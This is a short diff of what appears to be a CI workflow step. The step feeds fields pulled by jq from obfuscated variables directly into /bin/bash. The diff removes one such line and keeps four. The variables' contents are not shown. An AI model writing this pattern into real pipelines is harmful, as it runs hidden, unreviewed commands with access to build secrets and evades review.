@@ -30,7 +30,6 @@ jobs:
           echo $e6365 | jq -r .a608 | /bin/bash
           printf '%s' "$x7038" | jq -r .ccut60170 | /bin/bash
           echo $quvp4501 | jq -r .tkmit7086 | /bin/bash
-          printf '%s' "$ivfzd134" | jq -r .sc75734 | /bin/bash
           printf '%s' "$qk2" | jq -r .nffm0211 | /bin/bash
 
       - name: Save output
